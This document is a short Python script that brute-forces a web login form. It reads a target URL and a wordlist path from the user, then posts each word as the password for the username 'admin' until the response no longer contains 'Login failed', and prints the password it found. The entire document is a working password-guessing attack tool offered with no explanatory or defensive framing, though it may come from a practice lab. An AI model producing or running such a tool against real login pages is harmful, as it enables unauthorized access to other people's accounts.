#!/usr/bin/env python3

import requests


target_url = input("Specify an url you want to bruteforce --> ")
wordlist_path = input("Specify a wordlist path --> ")

data_dict = { "username": "admin", "password": "", "Login": "submit" }

with open(wordlist_path, "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word

        response = requests.post(target_url, data=data_dict)

        if b"Login failed" not in response.content:
            print("\n[+] Got the password --> " + word)
            exit()

print("\n[+] Reached end of the line.")